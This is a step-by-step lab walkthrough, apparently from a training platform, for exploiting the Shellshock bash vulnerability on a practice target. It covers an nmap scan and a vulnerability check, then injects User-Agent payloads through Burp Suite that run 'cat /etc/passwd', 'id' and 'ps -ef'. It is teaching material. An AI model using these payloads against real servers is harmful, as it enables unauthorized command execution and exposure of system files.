# LAB: Shellshock

#### **Step 1:** Open the lab link to access the Kali machine.

<figure><img src="https://assets.ine.com/lab/learningpath/70a0aa1189bd83fe58de3df6dba300a4a972805e46f9c84d9832afab6a2fff7b.jpg" alt=""><figcaption></figcaption></figure>

#### **Step 2:** Run Nmap scan on the target to find open ports.

**Command:**

```
nmap demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/2436e2881cbd9fdbfb5ffd4b0ea5f3e4e5b01e01d9d2ebeecddced0a46e8de62.jpg" alt=""><figcaption></figcaption></figure>

Port 80 is open

#### **Step 3:** Start firefox and navigate to the target domain.

**URL:**

```
http://demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/5009749deae5ada57291c6f04e2e9ca2e13af0302ec6ede96815a47a98752c60.jpg" alt=""><figcaption></figcaption></figure>

A website is running at port 80 of the target.

#### **Step 4:** Right-click and select "View Page Source."

<figure><img src="https://assets.ine.com/lab/learningpath/8823daabc5fed4074a55cbbd88558b9eac23313511707ad35646af8aab5d5228.jpg" alt=""><figcaption></figcaption></figure>

A CGI script is running on the target server.

#### **Step 5:** Use the Nmap NSE script to check if the server is vulnerable to shellshock attack.

**Command:**

```
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/f9ff6ea01e65a63566f716bca27559bdb9873c7cf53ec3b8a877ac3910b576ca.jpg" alt=""><figcaption></figcaption></figure>

The server is vulnerable to Shellshock attack.

#### **Step 6:** Search for the available exploit for shellshock vulnerability.

<figure><img src="https://assets.ine.com/lab/learningpath/9e049594517b14561ef55aee927a3d1506e5adff5bc1f79f117199787c209a7a.jpg" alt=""><figcaption></figcaption></figure>

#### **Step 7:** The GitHub link contains the steps to exploit the vulnerability.

**URL:** https://github.com/opsxcq/exploit-CVE-2014-6271

<figure><img src="https://assets.ine.com/lab/learningpath/47913a6302cd9c8f2459dc8e88879635adaafaf65ae93554c4d6b9ca4a250167.jpg" alt=""><figcaption></figcaption></figure>

The attacker has to craft malicious user-agent in order to exploit the vulnerability.

#### **Step 8:** Configure Firefox to use Burp Suite. Click on the FoxyProxy plugin icon on the top-right of the browser and select "Burp Suite."

<figure><img src="https://assets.ine.com/lab/learningpath/5b6983696578c128d12d48200bc751be894798e9b0870a028156bc34b3ecef29.jpg" alt=""><figcaption></figcaption></figure>

#### **Step 9:** Start Burp Suite, navigate to proxy, and turn on the intercept.

Reload the page and intercept the request with Burp Suite.

<figure><img src="https://assets.ine.com/lab/learningpath/a76d6d4ac7bfe6280f3b326e6458ff16129b9717f9e210427fce1e854b59d1c8.jpg" alt=""><figcaption></figcaption></figure>

#### **Step 10:** Right-click and select “Send to Repeater” Option and Navigate to the Repeater tab.

<figure><img src="https://assets.ine.com/lab/learningpath/614a649cc29b68807b9cefaf7d4eca247e602312d4482ebcdbff527bdf9c7c6d.jpg" alt=""><figcaption></figcaption></figure>

#### **Step 11:** Modify the User-Agent and inject the malicious payload.

**Payload:**

```
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

<figure><img src="https://assets.ine.com/lab/learningpath/8b77c41dd83f78deca854e91662a659856d43a77837242cd2347661d04624220.jpg" alt=""><figcaption></figcaption></figure>

Click on the Send button.

<figure><img src="https://assets.ine.com/lab/learningpath/fae12094183850d221b8d416db4500c00f34d401cfc741ca5ea20ac3c779a243.jpg" alt=""><figcaption></figcaption></figure>

The command executed successfully.

#### **Step 12:** Modify the payload to execute the ‘id’ command.

**Payload:**

```
() { :; }; echo; echo; /bin/bash -c 'id'
```

<figure><img src="https://assets.ine.com/lab/learningpath/262899f1b5c1992fe834d2320ea249e27e6364604682d4f32c3f1597eb22a297.jpg" alt=""><figcaption></figcaption></figure>

#### **Step 13:** Modify the payload to execute ‘ps -ef’ command.

**Payload:**

```
() { :; }; echo; echo; /bin/bash -c 'ps -ef'
```
